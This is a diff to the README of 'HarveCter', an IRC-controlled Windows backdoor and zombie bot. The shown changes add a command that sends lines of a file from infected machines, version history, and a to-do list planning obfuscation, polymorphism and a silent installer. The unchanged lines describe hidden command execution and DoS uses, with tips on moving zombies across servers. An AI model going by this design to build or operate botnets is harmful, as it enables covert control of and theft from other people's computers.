@@ -17,7 +17,7 @@
  <>   Name:                  HarveCter                                                                <>
  <>   Subject:               IRC Bot                                                                  <>
  <>   Description:           Remote Control/Backdoor/Zombie/etc... Everything is controled by IRC     <>
- <>   Version:               1.0b                                                                     <>
+ <>   Version:               1.0                                                                     <>
  <>                                                                                                   <>
  <>  <>DETAILS                                                                                        <>
  <>   Platform:              Microsoft Windows (Tested on XP SP2)                                     <>
@@ -58,6 +58,7 @@ rather than sending bots directly to one server (as irc.2600.net:6667)!!!
 - !SAY [msg]                  //Say msg
 - !CMD [shell command]        //Execute command @ bot (hidden console window)
 - !CMD start [shell command]  //Execute command @ bot (show console window)
+- !head [file to send]        //Send few (maxlines_to_send) lines of file
 - !raw [line to send]         //Sends raw line to server (you can OP yourself)
 - !info                       //Info about zombie
 - !time                       //Local time @ zombie
@@ -84,7 +85,7 @@ This binary must be fully controlled from CLI (command line).
 - Runtimes          - Unix(CygWin), Java(JArX) PHP, Perl, Python
 - NirCMD2           - (nircmdc.exe) Work with special windows features (mouse,gui,system functions,...)
 - CLAmp (clamp.exe) - Winamp Control (Yeah! What do you expected???)
-- Anything else     - DoS, mailing (Don't do any ilegal stuff with this - yust testing!!!)
+- Anything else     - DoS, mailing (Don't do any ilegal stuff with this - just testing!!!)
 
  <>Recommendations:
 - Use some free DNS service to move zombies across servers.
@@ -94,13 +95,24 @@ This binary must be fully controlled from CLI (command line).
 
  <>Version history:
 - future  - Maybe some bugfixes
-- 0.1b    - bugfixes (cmdfile), Implemented "!respawn"
+- 1.0     - Fixed for overflows, checked bounds, etc..., reformated/reidented source
+- 1.0bRC1 - Implemented Connection checker (new thread), Implemented "!line"
+- 1.0b    - Bugfixes (cmdfile), Implemented "!respawn"
 - 0.9     - Executing hircb.rc.bat at startup, first use "In the Wild" -> found bugs, need "!respawn"
 - 0.8     - Hidden execution
 - 0.7     - Implemented "!info" & "!time"
 - 0.6     - Implemented "!login" function
 - 0.5     - Implemented "!CMD" function
 - other   - I can't remember ;D
+
+ <>To Do:
+- Need SSL to Rock!
+- Binary obfuscation better than UPX
+- Polymorfism?
+- Test binary on "W0W MS OS Vista" (sorry, im running Linux ;)
+- Implement some minimalistic hack, which allows you to download wget
+- Utility for changing bot settings by direct binary patching without recompiling
+- Automatic silent installer
 
  <>Terms of use:
 - Use it like you want [use, change, abuse]!
@@ -110,4 +122,4 @@ This binary must be fully controlled from CLI (command line).
 
  <>=====0=======================================================================================1=====<>
  <>======0=======================================================================================1====<>
- <>====000=============================================================== <-- Harvie 2oo7 =====111====<>
+ <>====000============================================================= <-- Harvie 2oo7/8 =====111====<>
